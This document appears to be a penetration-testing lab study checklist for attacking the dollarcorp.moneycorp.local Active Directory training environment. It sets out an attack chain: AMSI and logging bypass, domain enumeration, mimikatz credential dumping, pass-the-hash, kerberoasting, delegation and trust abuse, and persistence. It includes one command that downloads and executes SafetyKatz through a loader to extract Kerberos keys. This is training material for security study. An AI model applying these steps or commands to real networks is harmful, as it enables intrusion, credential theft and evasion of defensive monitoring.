# Steps to take
- First open cmd set execution policy to bypass
- Use Invisi-Shell to bypass scriptBlock logging, Module logging, Transcription and AMSI.
- Try bypassing .net AMSI using the code snippet provided in lab manual.
- If constrained language mode also known as controlled language mode is enabled see applocker policy and run scripts from allowed directory.
- Enumerate Current Domain, Forest, Users, Computers, Domain Admins, Groups, Domain Controller information, enterprise administrators using AD module or PowerView.
- Enumerate Group Policy Objects by getting list of all GPO in current domain, List all OUs(Organizational Units), List GPOs applied to each Organizational Unit.
- Enumerate ACL for groups(ex: domain admins), get interesting ACEs, ACL for domain, forest, etc. Focus on Generic all, Generic write permissions and keep note of it.
- Enumerate trusts of current domain, current forest, another forest, all domains for another forest, external trust of all domains in current forest.
- Enumerate file shares, file server and sensative files.
- Find machines where current compromised user has local admin access, Find computers where a domain admin/high value user has sessions, etc
- Escalate privilege on current machine.
- Run mimikatz on current machine and check for other user's creds.
- Access that machine where your user has admin rights using lateral movement technique(ex: winrs)
- Run mimikatz or safetykatz on that machine bypassing by first transferring Loader.exe on allowed directory(applocker policy) then port forwrding to download and execute mimikatz, safetykatz from your initial compromised machine(C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit)
- Run over pass the hash(From your initial machine) using creds for the latest extracted users and again find local admin access for that user on any other machine.
- Repeat the steps.
- After getting domain admin access go for persistance.
- If we do not find other paths after compromising a user example our compromised user/users do not have session or local admin rights on other machine then check kerberoasting as well as asreproasting.
- Check for Set SPN targeted kerberoasting attack if you have generic all or generic write privilege on a user.
- Check for unconstrained delegation.
- Check for constrained delegation.
- Check for Resource Based Constrained delegation(RBCD)
- Check For priv esc via trusts/ trust attacks(Priv-Esc-Trusts-Inside-Forest.md and Priv-Esc-Trusts-Across-Forest.md) read below............

# Now it will be turn for compromising other domains
Here, after getting domain admin we are only administrator of domain dollarcorp.moneycorp.local in the moneycorp.local forest. We got access to studentvm.dollarcorp.moneycorp.local, got reverse shell via jenkins in dcorp-ci.dollarcorp.moneycorp.local, knew student1 had local admin rights and got access to dcorp-adminsrv.dollarcorp.moneycorp.local and got appadmin creds then accessed dcorp-appsrv.dollarcorp.moneycorp.local. knew ciadmin is local admin on dcorp-mgmt.dollarcorp.moneycorp.local where we got domain admin creds, also knew ci admin has write permission over dcorp-mgmt so we utilized RBCD to get to dcorp-mgmt.dollarcorp.moneycorp.local and many attacks all these attacks were performed and domain admin was compromised and persistance was setup for dollarcorp.moneycorp.local domain in moneycorp.local forest there may be multiple domains like rupeescorp.moneycorp.local there may be child domain of dollarcorp that is us.dollarcorp.moneycorp.local so on so in order to now compromise other domains(users and computers in other domains) we utilize Cross Trust attacks or prvilege escalation to other domains via trusts. read Priv-Esc-Trusts.md

- Check For AD CS misconfigurations for privilege escalation inside forest.